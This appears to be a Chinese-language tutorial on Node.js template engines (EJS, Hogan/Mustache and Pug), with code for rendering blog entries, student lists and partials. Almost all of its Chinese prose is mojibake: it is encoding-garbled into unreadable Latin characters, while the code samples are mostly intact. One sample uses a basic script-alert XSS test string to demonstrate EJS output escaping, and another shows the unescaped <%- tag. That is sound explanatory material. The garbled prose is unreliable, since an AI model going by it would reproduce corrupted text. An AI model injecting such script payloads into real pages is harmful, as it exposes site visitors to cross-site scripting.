entries.push(entry); &#125;); return entries;&#125;const entries = getEntries();console.log(entries);const server = http.createServer((req, res) =&gt; &#123; const output = blogPage(entries); res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end(output);&#125;);server.listen(8000); é¡µé¢ç”¨å‡½æ•° blogPage å‡½æ•°æ¸²æŸ“çš„ï¼Œç”¨å®ƒæŠŠæ–‡ç« æ¸²æŸ“åˆ° HTML é¡µé¢ä¸­ï¼Œä»¥ä¾¿å‘é€æµè§ˆå™¨ï¼Œæœ‰ä¸¤ç§ä¸åŒçš„å°è¯•æ–¹å¼,ç”¨æ¨¡æ¿å’Œä¸ç”¨æ¨¡æ¿ã€‚ ä¸ç”¨æ¨¡æ¿åšå®¢ç¨‹åºå¯ä»¥ç›´æŽ¥è¾“å‡º HTMLï¼Œä½†æ‚å¤„ç†é€»è¾‘ä¸­å¼•å…¥ HTML ä¼šè®©ä»£ç å˜å¾—å¾ˆä¹± 1234567891011121314151617181920212223function blogPage(entries) &#123; let output = ` &lt;html&gt; &lt;head&gt; &lt;style type="text/css"&gt; .entry_title &#123; font-weight: bold; &#125; .entry_date &#123; font-style: italic; &#125; .entry_body &#123; margin-bottom: 1em; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;/html&gt; ` entries.map(entry =&gt; &#123; output += ` &lt;div class="entry_title"&gt;$&#123;entry.title&#125;&lt;/div&gt; &lt;div class="entry_date"&gt;$&#123;entry.date&#125;&lt;/div&gt; &lt;div class="entry_body"&gt;$&#123;entry.body&#125;&lt;/div&gt; ` &#125;); output += `&lt;/body&gt;&lt;/html&gt;`; return output;&#125; å¯ä»¥çœ‹å‡ºæ¥ï¼Œé€»è¾‘ä¸­æœ‰å¾ˆå¤š HTML ä¼šæ˜¾å¾—å¾ˆä¹±ã€‚ ç”¨æ¨¡å—æ¸²æŸ“ HTML æ¨¡æ¿å¯ä»¥æŠŠ HTML ä»Žå¤„ç†é€»è¾‘ä¸­æŒªèµ°ï¼Œå¤§å¹…åº¦æé«˜ä»£ç çš„æ•´æ´æ€§ã€‚ å®‰è£… Embedded JavaScript æ¨¡å—æ¼”ç¤ºï¼š 1npm install ejs åŠ è½½æ¨¡æ¿ 1234567const ejs = require('ejs');const template = fs.readFileSync('./template/blog_page.ejs', 'utf8');function blogPage() &#123; const values = &#123; entries &#125;; return ejs.render(template, values);&#125; EJS æ¨¡æ¿æ–‡ä»¶æ˜¯ç”± HTML æ ‡è®°å’Œæ•°æ®å ä½ç¬¦æž„æˆçš„ã€‚ 1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt; &lt;style&gt; .entry_title &#123; font-weight: bold; &#125; .entry_date &#123; font-style: italic; &#125; .entry_body &#123; margin-bottom: 1em; &#125; &lt;/style&gt; &lt;body&gt; &lt;% entries.map(entry =&gt;&#123; %&gt; &lt;div class=&quot;entry_title&quot;&gt;&lt;%= entry.title %&gt;&lt;/div&gt; &lt;div class=&quot;entry_date&quot;&gt;&lt;%= entry.date %&gt;&lt;/div&gt; &lt;div class=&quot;entry_body&quot;&gt;&lt;%= entry.body %&gt;&lt;/div&gt; &lt;% &#125;) %&gt; &lt;/body&gt;&lt;/head&gt;&lt;/html&gt; Node ç¤¾åŒºåˆ›å»ºäº†å¾ˆå¤šæ¨¡æ¿å¼•æ“Žï¼ŒHTML éœ€è¦é—­åˆæ ‡ç­¾ï¼Œè€Œ CSS éœ€è¦å·¦å³å¤§æ‹¬å·ï¼Œä¼šæœ‰ç‰¹æ®Šçš„è¯­è¨€ï¼Œä¾‹å¦‚ Pug è¯­è¨€å¯ä»¥æ›´ç®€æ´åœ°è¡¨ç¤º HTML æˆ–è€… CSS ã€‚ æœ¬èŠ‚ä¼šä»‹ç»ä¸‰ç§æ¨¡æ¿å¼•æ“Žï¼Œä»¥åŠåœ¨ Node ä¸­å¦‚ä½•å–ä½¿ç”¨å®ƒä»¬ï¼š Embedded JavaScript ï¼ˆEJSï¼‰å¼•æ“Ž æžç®€çš„ Hogan å¼•æ“Ž Pug æ¨¡æ¿å¼•æ“Ž Embedded JavaScript çš„æ¨¡æ¿Embedded JavaScript å¤„ç†æ¨¡æ¿çš„æ–¹å¼ç®€å•ç›´æŽ¥ï¼Œå¯ä»¥æŠŠ EJS æ ‡ç­¾å½“åšæ•°æ®å‡†å¤‡çš„å ä½ç¬¦åµŒå…¥åˆ° HTML ä¸­ï¼Œè¿˜å¯ä»¥åœ¨æ¨¡æ¿ä¸­æ‰§è¡Œçº¯ JavaScript ä»£ç ï¼Œå°±åƒ PHP é‚£æ ·å®Œæˆæ¡ä»¶åˆ†æ”¯å’Œå¾ªçŽ¯ä¹‹ç±»çš„å·¥ä½œã€‚ åˆ›å»ºæ¨¡æ¿åœ¨æ¨¡æ¿çš„ä¸–ç•Œä¸­ï¼Œå‘é€ç»™æ¨¡æ¿å¼•æ“Žåšæ¸²æŸ“çš„æ•°æ®æœ‰æ—¶è¢«ç§°ä¸ºä¸Šä¸‹æ–‡ï¼Œè€Œä¸‹é¢æ˜¯ EJS ç”¨ä¸€ä¸ªç®€å•çš„æ¨¡æ¿æ¸²æŸ“ä¸Šä¸‹æ–‡çš„ä¾‹å­ï¼š 1234const ejs = require('ejs');const template = '&lt;%= message %&gt;'const context = &#123; message: 'Hello template!'&#125;console.log(ejs.render(template, context)); æ³¨æ„å‘é€ç»™ render ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„ locals çš„ç”¨æ³•ã€‚ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥åŒ…å« EJS é€‰é¡¹ä»¥åŠä¸Šä¸‹æ–‡æ•°æ®ï¼Œè€Œ locals å¯ä»¥ç¡®ä¿ä¸Šä¸‹æ–‡æ•°æ®ä¸ä¼šè¢«å½“åš EJS é€‰é¡¹ã€‚ä½†å¤§å¤šæ•°æƒ…å†µä¸‹ä½ éƒ½å¯ä»¥æŠŠä¸Šä¸‹æ–‡æœ¬èº«å½“åšç¬¬äºŒä¸ªå‚æ•°ï¼Œä¾‹å¦‚ä¸‹é¢render: 1console.log(ejs.render(template,context)); å¦‚æžœæŠŠä¸Šä¸‹æ–‡ç›´æŽ¥å½“åš render çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸€å®šä¸è¦ç»™ä¸Šä¸‹æ–‡ä¸­çš„å€¼ç”¨è¿™äº›åç§°ï¼šcache/client/close/compileDebug/debug/filename/open/scope ã€‚å®ƒä»¬æ˜¯ä¸ºä¿®æ”¹æ¨¡æ¿å¼•æ“Žè®¾å®šçš„ä¿ç•™å­—ã€‚ å­—ç¬¦è½¬ä¹‰åœ¨æ¸²æŸ“æ—¶ï¼ŒEJS ä¼šè½¬ä¹‰ä¸Šä¸‹æ–‡å€¼ä¸­çš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œå°†å®ƒä»¬æ›¿æ¢ä¸º HTML å®žä½“ç ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢è·¨ç«™è„šæœ¬(xss)æ”»å‡»ï¼Œæ¶æ„ç”¨æˆ·ä¼šå°† JavaScript ä½œä¸ºæ•°æ®æäº¤ç»™ Web ç¨‹åºï¼Œå¸Œæœ›å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«è¿™äº›æ•°æ® çš„é¡µé¢æ—¶èƒ½åœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚ä¸‹é¢çš„ä»£ç å±•ç¤ºäº† EJS çš„è½¬ä¹‰å¤„ç†ã€‚ 1234const ejs = require('ejs');const template = '&lt;%= message %&gt;'const context = &#123; message: "&lt;script&gt; alert('XSS attack);&lt;script/&gt;"&#125;console.log(ejs.render(template,context)); è¿™æ®µä»£ç åœ¨æ˜¾ç¤ºæ—¶ä¼šè¾“å‡ºä¸‹é¢è¿™ç§ä»£ç ï¼š 1&amp;lt;script&amp;gt;alert('XSS attack');&amp;lt;/script&amp;gt; å¦‚æžœç”¨åœ¨æ¨¡æ¿ä¸­çš„æ˜¯å¯ä¿¡æ•°æ®ï¼Œä¸æƒ³åšè½¬ä¹‰å¤„ç†ï¼Œå¯ä»¥ç”¨ &lt;%-ä»£æ›¿ &lt;%= ï¼š 123456const ejs = require('ejs');const template = '&lt;%- message %&gt;'const context = &#123; message: "&lt;script&gt;alert('Trusted JavaScript!');&lt;/script&gt;" &#125;; console.log(ejs.render(template, context)); æ³¨æ„ï¼æŒ‡æ˜Ž EJS æ ‡ç­¾çš„å­—ç¬¦æ˜¯å¯ä¿®æ”¹çš„ï¼Œæ¯”å¦‚åƒè¿™æ ·ï¼š 12345const ejs = require('ejs');ejs.delimiter = '$';const template = '&lt;$= message $&gt;'const context = &#123; message: 'Hello template!' console.log(ejs.render(template,context)); å°† EJS é›†æˆåˆ°ä½ çš„ç¨‹åºä¸­æŠŠæ¨¡æ¿å’Œä»£ç æ”¾åˆ°åŒä¸€ä¸ªæ–‡ä»¶é‡Œå¾ˆåˆ«æ‰­ï¼Œå¹¶ä¸”ä¼šæ˜¾å¾—ä»£ç å¾ˆä¹±ã€‚æŽ¥ä¸‹æ¥ä½¿ç”¨ Node API ä»Žå•ç‹¬çš„æ–‡ä»¶ä¸­è¯»å–æ¨¡æ¿ã€‚ è¿›å…¥å·¥ä½œç›®å½•ï¼Œåˆ›å»º app.js æ–‡ä»¶ï¼ŒæŠŠä¸‹é¢çš„ä»£ç æ”¾åœ¨é‡Œé¢ã€‚ 123456789101112131415161718192021222324252627282930// app.jsconst ejs = require('ejs');const fs = require('fs');const http = require('http');const filename = './template/students.ejs';const students = [ &#123; name: 'Rick LaRue', age: 23 &#125;, &#123; name: 'Sarah Cathands', age: 25 &#125;, &#123; name: 'Bob Dobbs', age: 37 &#125;];// åˆ›å»º HTTP æœåŠ¡å™¨const server = http.createServer((req, res) =&gt; &#123; if (req.url === '/') &#123; // ä»Žæ–‡ä»¶ä¸­è¯»å–æ¨¡æ¿ fs.readFile(filename, (err, data) =&gt; &#123; const template = data.toString(); const context = &#123; students: students &#125;; // æ¸²æŸ“æ¨¡æ¿ const output = ejs.render(template, context); res.setHeader('Content-Type', 'text/html'); // å‘é€å“åº” res.end(output); &#125;); &#125;else&#123; res.statusCode = 404; res.end('Not Found'); &#125;&#125;); server.listen(8000); æŽ¥ä¸‹æ¥åˆ›å»ºå­˜æ”¾æ¨¡æ¿æ–‡ä»¶çš„ students.ejs æ–‡ä»¶ã€‚ 1234567&lt;% if (students.length) &#123; %&gt; &lt;ul&gt; &lt;% students.forEach(student =&gt;&#123; %&gt; &lt;li&gt;&lt;%= student.name %&gt; (&lt;%= student.age %&gt;)&lt;/li&gt; &lt;% &#125;) %&gt; &lt;/ul&gt;&lt;% &#125; %&gt; ç¼“å­˜ EJS æ¨¡æ¿å¦‚æžœæœ‰å¿…è¦ï¼Œå¯ä»¥è®© EJS æŠŠæ¨¡æ¿å‡½æ•°ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è§£æžå®Œæ¨¡æ¿æ–‡ä»¶åŽï¼ŒEJS å¯ä»¥æŠŠè§£æžå¾—åˆ°çš„å‡½æ•°å­˜ä¸‹æ¥ã€‚è¿™æ ·ä»¥åŽéœ€è¦æ¸²æŸ“è¿™ä¸ªæ¨¡æ¿æ—¶ä¸ç”¨å†æ¬¡è§£æžï¼Œæ‰€ä»¥æ¸²æŸ“é€Ÿåº¦ä¼šå¿«ã€‚ å¦‚æžœæ­£åœ¨å¼€å‘è¿‡ç¨‹å½“ä¸­ï¼Œæƒ³å³æ—¶çœ‹åˆ°æ¨¡æ¿æ–‡ä»¶ä¿®æ”¹åŽçš„æ•ˆæžœï¼Œåˆ™ä¸è¦å¯ç”¨ç¼“å­˜ã€‚ä½†åœ¨æŠŠç¨‹åºéƒ¨ç½²åˆ°ç”Ÿäº§çŽ¯å¢ƒä¸­æ—¶ï¼Œå¯ç”¨ç¼“å­˜æ˜¯ä¸€ç§ç®€å•å¿«æ·çš„æ€§èƒ½ä¼˜åŒ–åŠžæ³•ã€‚å¯ä»¥é€šè¿‡çŽ¯å¢ƒå˜é‡ NODE_ENVåˆ¤å®šæ˜¯å¦å¯ç”¨ç¼“å­˜ 12345const cache = process.env.NODE_ENV === 'production'const output = ejs.render( template, &#123; students, cache, filename &#125;); ç¬¬äºŒä¸ªå‚æ•°çš„ filename é€‰é¡¹ä¸ä»…é™äºŽæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è¦æ¸²æŸ“çš„æ¨¡æ¿çš„å”¯ä¸€æ ‡è¯†ã€‚æŽ¥ä¸‹æ¥çœ‹çœ‹æ€Žä¹ˆåœ¨å®¢æˆ·ç«¯ä½¿ç”¨ EJSã€‚ åœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­ä½¿ç”¨ EJS è¦åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ EJS ï¼Œé¦–å…ˆè¦å…ˆæŠŠ EJS æœç´¢å¼•æ“Žä¸‹è½½åˆ°å·¥ä½œç›®å½•ä¸‹é¢ 1curl -O https://raw.githubusercontent.com/tj/ejs/master/lib/ejs.js ä¸‹è½½å®Œå°±å¯ä»¥åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ EJS ï¼Œä¸‹é¢ä»£ç å­˜ä¸º index.html å¹¶è¯•ç€åœ¨æµè§ˆå™¨æ‰“å¼€è¿è¡Œ 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;script src="./ejs.js"&gt;&lt;/script&gt; &lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.js"&gt; &lt;/script&gt; &lt;title&gt;EJS example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="output"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; const template = "&lt;%= message %&gt;"; const context = &#123; message: 'Hello template!' &#125;; $(document).ready(() =&gt; &#123; $('#output').html( ejs.render(template, context) ) &#125;);&lt;/script&gt;&lt;/html&gt; Hogan æ¨¡æ¿å¼•æ“Žï¼Œç‰¹æ„é™åˆ¶äº†æ¨¡æ¿ä»£ç ä¸­å¯ç”¨çš„åŠŸèƒ½ã€‚ ä½¿ç”¨ Mustache æ¨¡æ¿è¯­è¨€ä¸Ž HoganHogan.js æ˜¯ Twitter ä¸ºæ»¡è¶³è‡ªå·±çš„éœ€æ±‚è€Œåˆ›å»ºçš„å¼•æ“Žæ¨¡æ¿ã€‚Hogan æ˜¯ Mustache æ¨¡æ¿è¯­è¨€æ ‡å‡†çš„å…·ä½“å®žçŽ°ã€‚ è·Ÿ EJS ä¸ç”¨çš„æ˜¯ï¼ŒMustache éµå¾ªæžç®€ä¸»ä¹‰ï¼Œç‰¹æ„åŽ»æŽ‰äº†æ¡ä»¶é€»è¾‘ã€‚åœ¨å†…å®¹è¿‡æ»¤ä¸Šï¼ŒMustache åªä¸ºé˜²æ­¢XSS çš„æ”»å‡»è€Œä¿ç•™äº†è½¬ä¹‰å¤„ç†åŠŸèƒ½ï¼Œä¸»å¼ æ¨¡æ¿ä»£ç åº”è¯¥å°½å¯èƒ½åœ°ç®€å•ã€‚ æœ¬èŠ‚å°†ä»‹ç»ï¼š å¦‚ä½•åœ¨ç¨‹åºä¸­åˆ›å»ºå’Œå®žçŽ° Mustache æ¨¡æ¿ Mustache æ ‡å‡†ä¸­çš„å„ç§æ¨¡æ¿æ ‡ç­¾ å¦‚ä½•ç”¨å­æ¨¡æ¿ç»„ç»‡æ¨¡æ¿ å¦‚ä½•ç”¨å®šåˆ¶çš„åˆ†éš”ç¬¦å’Œå…¶ä»–é€‰é¡¹å¯¹ Hogan è¿›è¡Œå¾®è°ƒ åˆ›å»ºæ¨¡æ¿è¦ä½¿ç”¨ Hogan ï¼ŒåŒæ ·å…ˆå®‰è£… 1npm i -save hogan.js ä¸‹é¢æ˜¯ç”¨ Hogan ä½¿ç”¨ç®€å•æ¨¡æ¿æ¸²æŸ“ä¸Šä¸‹æ–‡çš„ä¾‹å­ã€‚è¿è¡ŒåŽè¾“å‡º â€™Hello templateâ€˜ 12345const hogan = require('hogan.js');const templateSource = '&#123;&#123;message&#125;&#125;';const context = &#123; message: 'Hello Template' &#125;const template = hogan.compile(templateSource);console.log(template.render(context)); 1node index.js äº†è§£å¦‚ä½•ç”¨ Hogan å¤„ç† Mustache æ¨¡æ¿åŽï¼Œä¸‹é¢çœ‹çœ‹å®ƒæ”¯æŒå“ªäº›æ ‡ç­¾ Mustache æ ‡ç­¾Mustache æ ‡ç­¾åœ¨æ¦‚å¿µä¸Šè·Ÿ EJS çš„æ ‡ç­¾ç±»ä¼¼ï¼Œä¹Ÿæœ‰å˜é‡å€¼çš„å ä½ç¬¦ï¼ŒæŒ‡æ˜Žå“ªé‡Œéœ€è¦å¾ªçŽ¯ã€‚å¯ä»¥å¢žå¼º Mustache çš„åŠŸèƒ½ï¼Œåœ¨æ¨¡æ¿é‡Œæ·»åŠ æ³¨é‡Šã€‚ 1.æ˜¾ç¤ºç®€å•çš„å€¼åœ¨ Mustache æ¨¡æ¿ä¸­ï¼Œè¦æŠŠæƒ³è¦æ˜¾ç¤ºçš„ä¸Šä¸‹æ–‡çš„åç§°æ”¾åœ¨å¤§æ‹¬å·ä¸­ã€‚å¤§æ‹¬å·åœ¨ Mustache ç¤¾åŒºé‡Œè¢«ç§°ä¸ºèƒ¡é¡»ã€‚æ¯”å¦‚è¯´ï¼Œè¦æ˜¾ç¤ºä¸Šä¸‹æ–‡é¡¹ name çš„å€¼ï¼Œåº”è¯¥ä½¿ç”¨ Hogan æ ‡ç­¾ 1&#123;&#123;name&#125;&#125; è·Ÿå¤§å¤šæ•°æ¨¡æ¿ä¸€æ ·ï¼ŒHogan é»˜è®¤ä¹Ÿä¼šå¯¹å†…å®¹è¿›è¡Œè½¬ä¹‰ä»¥é˜²æ­¢XSS æ”»å‡»ï¼Œå¦‚æžœæƒ³è¦åœ¨ Hogan ä¸­æ˜¾ç¤ºæœªè½¬ä¹‰çš„å€¼ï¼Œæ—¢å¯ä»¥æŠŠä¸Šä¸‹æ–‡çš„åç§°æ”¾åœ¨ç¬¬ä¸‰æ¡èƒ¡é¡»ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨å‰é¢æ·»åŠ ä¸€ä¸ª &amp; ç¬¦å·ã€‚ ä¾‹å¦‚ 1&#123;&#123;&amp;name&#125;&#125; å¦‚æžœæƒ³åœ¨æ¨¡æ¿ä¸­åŠ æ³¨é‡Šï¼Œå¯ä»¥è¿™æ · 1&#123;&#123;! This is a comment&#125;&#125; 2.åŒºå—ï¼šå¤šä¸ªå€¼çš„å¾ªçŽ¯éåŽ†å°½ç®¡ Hogan ä¸å…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨é€»è¾‘ï¼Œä½†æ˜¯å®ƒç¡®å®žå¼•å…¥äº†ä¸€ç§æ›´åŠ ä¼˜é›…çš„æ–¹æ³•ï¼Œç”¨ Mustache åŒºå—å¯¹ä¸Šä¸‹æ–‡é¡¹ä¸­å¤šä¸ªå€¼åšå¾ªçŽ¯éåŽ†ï¼š 123456const context = &#123; students:[ &#123; name: 'J', age:'23'&#125;, &#123; name: 'L', age:'53'&#125; ]&#125; å¦‚æžœè¦åˆ›å»ºä¸€ä¸ªæ¨¡æ¿ï¼Œè®©æ¯ä¸ªå­¦ç”Ÿéƒ½æ˜¾ç¤ºåœ¨å•ç‹¬çš„ HTML æ®µè½ä¸­ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·è½»æ¾å®žçŽ°ï¼š 12&lt;p&gt;Name: J,Age: 23 years old &lt;/p&gt;&lt;p&gt;Name: L,Age: 53 years old &lt;/p&gt; ä¸‹é¢è¿™ä¸ªæ¨¡æ¿èƒ½ç”Ÿæˆä¸Šé¢çš„ HTML : 123&#123;&#123;# students&#125;&#125; &lt;p&gt;Name: &#123;&#123;name&#125;&#125;, Age: &#123;&#123;age&#125;&#125; years old &lt;/p&gt;&#123;&#123;/students&#125;&#125; 3.åå‘åŒºå—ï¼šå€¼ä¸å­˜åœ¨æ—¶çš„é»˜è®¤ HTMLå¦‚æžœä¸Šä¸‹æ–‡æ•°æ®ä¸­çš„ students ä¸æ˜¯æ•°ç»„ä¼šæ€Žä¹ˆæ ·ï¼Ÿæ¯”å¦‚è¯´ï¼Œå¦‚æžœåªæ˜¯å•ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæ¨¡æ¿äº’æ˜¾ç¤ºè¿™ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯å¦‚æžœæ˜¯ undefined æˆ– false ,ç©ºæ•°ç»„ï¼Œåˆ™ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤ºã€‚ å¦‚æžœæƒ³è¾“å‡ºæ¶ˆæ¯æŒ‡æ˜Žè¯¥åŒºå—çš„å€¼ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ Mustache çš„åå‘åŒºå—ã€‚æŠŠä¸‹é¢çš„å¿«æ¨¡æ¿ä»£ç åŠ åˆ°å‰é¢é‚£ä¸ªæ˜¾ç¤ºå­¦ç”Ÿæ¶ˆæ¯çš„æ¨¡æ¿ä¸­ï¼Œä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰æ•°æ®æ—¶å°±ä¼šæ˜¾ç¤ºè¿™æ¡æ¶ˆæ¯ï¼š 123&#123;&#123;^ students&#125;&#125; &lt;p&gt;No students found&lt;/p&gt;&#123;&#123;/ students&#125;&#125; 4.åŒºå— lambda: åŒºå—å†…çš„å®šåˆ¶åŠŸèƒ½å¦‚æžœ Mustache çŽ°æœ‰åŠŸèƒ½æ— æ³•æ»¡è¶³ï¼Œå¯ä»¥æŒ‰ç…§å®ƒçš„æ ‡å‡†å®šåˆ¶åŒºå—æ ‡ç­¾ã€‚è®©å®ƒè°ƒç”¨å‡½æ•°å¤„ç†æ¨¡å—å†…å®¹ï¼Œä¸ç”¨å¾ªçŽ¯éåŽ†æ•°ç»„ã€‚è¿™è¢«ç§°ä¸º åŒºå— lambda ã€‚ ä¸‹é¢çš„ä¾‹å­ç”¨åˆ°äº† github-flavored markdown æ¨¡å—: 1npm install github-flavored-markdown --dev åœ¨ä¸‹é¢è¿™æ®µä»£ç ä¸­ï¼Œæ¨¡æ¿ä¸­çš„Nameä¼ ç»™ç”±åŒºå— lambda è°ƒç”¨çš„ Markdown è§£æžå™¨ï¼Œç”Ÿæˆäº†Nameã€‚ 123456789101112const hogan = require('hogan.js');// å¼•å…¥ Markdown è§£æžå™¨const md = require('github-flavored-markdown');// Mustache æ¨¡æ¿ä¹ŸåŒ…å« Markdown æ ¼å¼çš„å†…å®¹const templateSource = `&#123;&#123;#markdown&#125;&#125;**Name**:&#123;&#123;name&#125;&#125;&#123;&#123;/markdown&#125;&#125;`;// æ¨¡æ¿çš„ä¸Šä¸‹æ–‡åŒ…å«äº†ä¸€ä¸ªè§£æž Markdown çš„åŒºå— lambdaconst context = &#123; name: 'Rick LaRue', markdown: () =&gt; text =&gt; md.parse(text)&#125;const template = hogan.compile(templateSource);console.log(template.render(context)); ä½¿ç”¨åŒºå— lambda å¯ä»¥åœ¨æ¨¡æ¿ä¸­è½»æ¾å®žçŽ°ç¼“å­˜å’Œè½¬æ¢æœºåˆ¶ç­‰åŠŸèƒ½ã€‚ 5.å­æ¨¡æ¿ï¼šåœ¨å…¶ä»–æ¨¡æ¿ä¸­é‡ç”¨æ¨¡æ¿ä¸ºäº†é¿å…å¤šä¸ªæ¨¡æ¿ä¸­å¤åˆ¶ç²˜è´´ç›¸åŒçš„ä»£ç ï¼Œå¯ä»¥å°†è¿™äº›é€šç”¨çš„ä»£ç åšæˆå­æ¨¡æ¿ï¼ˆpartialï¼‰ã€‚å­æ¨¡æ¿æ˜¯æ”¾åœ¨å…¶ä»–æ¨¡æ¿å†…çš„æž„ä»¶ï¼Œå¯ä»¥æŠŠå¤æ‚çš„æ¨¡æ¿åˆ†è§£æˆç®€å•æ¨¡æ¿ã€‚ æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå°†æ˜¾ç¤ºå­¦ç”Ÿæ•°æ®çš„ä»£ç ä»Žä¸»æ¨¡æ¿ä¸­åˆ†ç¦»å‡ºæ¥åšæˆäº†å­æ¨¡æ¿ã€‚ 1234567891011121314151617181920212223242526272829const hogan = require('hogan.js');// ç”¨äºŽå­æ¨¡æ¿çš„ä»£ç const studentTemplate = ` &lt;p&gt; Name: &#123;&#123; name &#125;&#125;, Age: &#123;&#123; age &#125;&#125; years old &lt;/p&gt;`// ä¸»æ¨¡æ¿const mainTemplate = ` &#123;&#123;# students&#125;&#125; &#123;&#123;&gt;student&#125;&#125; &#123;&#123;/ students&#125;&#125;`const context = &#123; students: [&#123; name: 'Jane Narwhal', age: 21 &#125;, &#123; name: 'Rick LaRue', age: 26 &#125;]&#125;// ç¼–è¯‘ä¸»æ¨¡æ¿å’Œå­æ¨¡æ¿const template = hogan.compile(mainTemplate);const partial = hogan.compile(studentTemplate);// æ¸²æŸ“ä¸»æ¨¡æ¿å’Œå­æ¨¡æ¿const html = template.render(context, &#123; student: partial &#125;);console.log(html); å¾®è°ƒ Hogan Hogan ç”¨èµ·æ¥ç›¸å½“ç®€å•ï¼ŒæŽŒæ¡å®ƒçš„æ ‡ç­¾æ±‡æ€»è¡¨å°±å¤Ÿäº†ã€‚åœ¨ä½¿ç”¨æ—¶å¯èƒ½åªæœ‰ä¸€ä¸¤ä¸ªåœ°æ–¹éœ€è¦è°ƒæ•´ä¸€ä¸‹. å¦‚æžœä½ ä¸å–œæ¬¢ Mustache é£Žæ ¼çš„å¤§æ‹¬å·ï¼Œå¯ä»¥ç»™ compile æ–¹æ³•ä¼ å…¥ä¸€ä¸ªå‚æ•°è¦†ç›– Hogan æ‰€ç”¨çš„åˆ†éš”ç¬¦ã€‚ä¸‹é¢çš„ä¾‹å­æŠŠ EJS é£Žæ ¼çš„åˆ†éš”ç¬¦ç¼–è¯‘åœ¨ Hogan ä¸­ï¼š 1hogan.compile(text, &#123; delimiters: '&lt;% %&gt;' &#125;); é™¤äº† Mustacheï¼Œè¿˜æœ‰å…¶ä»–æ¨¡æ¿è¯­è¨€ã€‚æ¯”å¦‚æƒ³æŠŠ HTML çš„å™ªå£°éƒ½åŽ»æŽ‰çš„ Pugã€‚ ç”¨ Pug åšæ¨¡æ¿Pug,ä»¥å‰å«åš Jade,å®ƒç”¨å¦ä¸€ç§æ–¹å¼æ¥è¡¨ç¤º HTMLï¼Œæ˜¯ Express çš„é»˜è®¤æ¨¡æ¿å¼•æ“Žã€‚Pug å’Œå…¶ä»–ä¸»æµæ¨¡æ¿ç³»ç»Ÿçš„å·®åˆ«ä¸»è¦åœ¨äºŽå®ƒå¯¹ç©ºæ ¼çš„ä½¿ç”¨ã€‚Pug æ¨¡æ¿ç”¨ç¼©è¿›è¡¨ç¤º HTML æ ‡ç­¾çš„åµŒå…¥å…³ç³»ã€‚HTML æ ‡ç­¾ä¹Ÿä¸å¿…æ˜Žç¡®ç»™å‡ºå…³é—­æ ‡ç­¾ï¼Œä»Žè€Œé¿å…äº†å› ä¸ºè¿‡æ—©å…³é—­ï¼Œæˆ–æ ¹æœ¬å°±ä¸å…³é—­æ ‡ç­¾æ‰€äº§ç”Ÿçš„é—®é¢˜ã€‚ç”±äºŽæœ‰ä¸¥æ ¼çš„ç¼©è¿›è§„åˆ™ï¼Œå› æ­¤ Pug æ¨¡æ¿çœ‹èµ·æ¥å¾ˆç®€æ´ï¼Œæ›´æ˜“äºŽç»´æŠ¤ã€‚ 12345678910&lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="main" class="content"&gt; &lt;strong&gt;"Hello world!"&lt;/strong&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; è¿™æ®µ HTML å¯¹åº”çš„ Pug æ¨¡æ¿å¦‚ä¸‹ï¼š 123456html head title Welcome body div.content#main strong &quot;Hello world!&quot; Pug åƒ EJS ä¸€æ ·ï¼Œå¯ä»¥åµŒå…¥ JavaScript ï¼Œå¯ä»¥ç”¨åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ã€‚ä½† Pug è¿˜æœ‰å…¶ä»–ç‰¹æ€§ï¼Œæ¯”å¦‚æ¨¡æ¿ç»§æ‰¿å’Œ mixinsã€‚ç”¨ mixins å¯ä»¥å®šä¹‰æ˜“äºŽé‡ç”¨çš„å°åž‹æ¨¡æ¿ï¼Œç”¨æ¥è¡¨ç¤ºå¸¸ç”¨çš„è§†è§‰å…ƒç´ çš„ HTML ï¼Œæ¯”å¦‚æ¡ç›®åˆ—è¡¨å’Œç›’å­ã€‚Mixins å¾ˆåƒä¸Šä¸€èŠ‚ä»‹ç»çš„ Hogan çš„è‡ªæœ«ç­ã€‚æœ‰äº†æ¨¡æ¿ç»§æ‰¿ï¼Œé‚£äº›æŠŠä¸€ä¸ª HTML é¡µé¢æ¸²æŸ“åˆ°å¤šä¸ªæ–‡ä»¶ä¸­ Pug æ¨¡æ¿ç»„ç»‡èµ·æ¥å°±æ›´å®¹æ˜“äº†ã€‚å…ˆå®‰è£…ï¼š 1npm install pug -S æœ¬èŠ‚ä»‹ç»ï¼š Pug çš„åŸºç¡€çŸ¥è¯†ï¼Œæ¯”å¦‚è¯´ç±»åã€å±žæ€§å’Œå—æ‰©å±• 